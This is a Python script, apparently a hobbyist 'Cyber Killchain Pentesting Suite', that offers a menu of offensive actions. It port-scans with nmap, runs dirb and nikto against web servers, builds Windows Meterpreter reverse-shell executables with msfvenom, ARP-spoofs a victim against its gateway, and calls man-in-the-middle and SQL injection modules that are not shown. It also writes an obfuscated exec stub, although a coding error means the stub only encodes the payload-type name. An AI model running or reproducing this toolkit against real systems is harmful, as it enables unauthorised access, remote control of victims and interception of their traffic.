# Import necessary modules
import base64
import os
import subprocess
import sys
import zlib
import nmap
import mitm
from lib.netmon import startmonitoring

from lib.sql_injection import SQLInjection


def run_sql_injection(target_url):
    sql_injection_tester = SQLInjection()
    result = sql_injection_tester.test_vulnerability(target_url)
    print(result)


# Define function to scan for open ports on a given IP address
def scan(ip):
    # Create a new nmap PortScanner object
    nm = nmap.PortScanner()
    # Scan the IP address for ports 1-10000 with service version detection and OS detection
    nm.scan(ip, '1-10000', arguments='-sV -O')
    # For each host that was found
    for host in nm.all_hosts():
        # For each protocol that was found
        for proto in nm[host].all_protocols():
            # Get all the open port numbers for this protocol
            lport = nm[host][proto].keys()
            # Sort the list of port numbers
            for port in sorted(lport):
                # Get the name of the service and its version number
                service = nm[host][proto][port]['name']
                version = nm[host][proto][port]['version']
                # Print the port number, state, service name, and version number
                print('port : %s\tstate : %s\tService : %s\tVersion : %s' % (
                    port, nm[host][proto][port]['state'], service, version))
        # Get the name of the operating system that was detected
        print('OS : %s' % nm[host]['osmatch'][0]['name'])


# Define function to perform directory busting on a given URL
def dirbust():
    url = input("Enter the URL to scan: ")
    # Call the dirb command with the given URL as an argument
    subprocess.call(['dirb', url])


# Define function to test for SQL injection vulnerabilities on a given URL
def sqlmap():
    url = input("Enter the URL to scan: ")
    # Call the sqlmap command with the given URL as an argument
    subprocess.call(['sqlmap', '-u', url])


# Define function to scan a web server for vulnerabilities using Nikto
def nikto():
    url = input("Enter the URL to scan: ")
    # Call the nikto command with the given URL as an argument
    subprocess.call(['nikto', '-h', url])


# Define function to scan a web server for vulnerabilities using Nuclei
def nuclei():
    url = input("Enter the URL to scan: ")
    # Call the nuclei command with the given URL as an argument
    subprocess.call(['nuclei', '-u', url])


# Define function to generate a Metasploit payload
def msfvenom():
    # Get the attacker's IP address and the desired listening port
    ip = input("Enter your IP address: ")
    port = input("Enter a port: ")
    # Get the desired name for the payload
    payload_name = input("Enter the name of the payload: ")
    # Set the payload type
    payload = 'windows/meterpreter/reverse_tcp'
    # Set the file format for the payload
    fformat = 'exe'
    # Encode the payload with base64 and compress it with zlib
    encoded_payload = base64.b64encode(payload.encode('utf-8'))
    compressed_payload = zlib.compress(encoded_payload)
    encoded_compressed_payload = base64.b64encode(compressed_payload)
    # Generate the payload code
    payload_code = f"import base64,zlib;exec(zlib.decompress(base64.b64decode('{encoded_compressed_payload.decode()}')))"
    # Use msfvenom to generate the payload file with the specified options
    os.system(f"msfvenom -p {payload} LHOST={ip} LPORT={port} -f {fformat} -o {payload_name}.{fformat}")
    # Write the payload code to a Python script file with the specified name
    with open(f'{payload_name}.py', 'w') as f:
        f.write(payload_code)
    print(f"Payload created: {payload_name}.{fformat}")


# Define function to perform an ARP spoofing attack
def arp():
    # Get the victim's IP address and the gateway's IP address
    victim_ip = input("Enter victim IP: ")
    gateway_ip = input("Enter gateway IP: ")
    # Call the arpspoof command with the specified arguments
    subprocess.call(['arpspoof', '-i', 'eth0', '-t', victim_ip, gateway_ip])


# Define function to display the main menu
def menu():
    while True:
        print("\nWelcome to the Cyber Killchain Pentesting Suite!\n")
        print("1. Port Scanning")
        print("2. Directory Busting")
        print("3. SQLInjection Testing")
        print("4. Web Server Scanning with Nikto")
        print("5. Generate Metasploit Payload")
        print("6. ARP Spoofing")
        print("7. Man-in-the-Middle Attack")
        print("8. Internal Network Monitor")
        print("9. Exit\n")
        # Get the user's choice
        choice = input("Enter your choice: ")
        # Call the appropriate function based on the user's choice
        if choice == '1':
            ip = input("Enter IP address to scan: ")
            scan(ip)
        elif choice == '2':
            dirbust()
        elif choice == '3':
            url = input("Enter URL address to act: ")
            run_sql_injection(url)
        elif choice == '4':
            nikto()
        elif choice == '5':
            msfvenom()
        elif choice == "6":
            arp()
        elif choice == "7":
            mitm.mitm()
        elif choice == "8":
            startmonitoring()
        elif choice == "9":
            exit()


if __name__ == "__main__":
    menu()
